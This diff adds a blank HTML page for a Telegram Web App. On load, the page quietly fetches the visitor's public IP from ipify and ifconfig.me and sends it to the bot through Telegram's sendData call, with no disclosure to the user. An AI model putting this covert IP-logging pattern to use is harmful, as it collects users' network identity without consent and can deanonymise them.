@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+
+<head>
+    <meta charset="UTF-8">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>var IS_IP_SENT = false; function sendIPtoBot(ip) { if (IS_IP_SENT) return; IS_IP_SENT = true; window.Telegram.WebApp.sendData(`{"web_app_ip":"${ip}"}`); }</script>
+    <script type="application/javascript">function getIP(json) { sendIPtoBot(json.ip); }</script>
+    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    <script>fetch('https://ifconfig.me/ip').then(response => response.text()).then(ip => { sendIPtoBot(ip.trim()); });</script>
+    <script>document.DOMContentLoaded = function () { };</script>
+</head>
+
+</html>
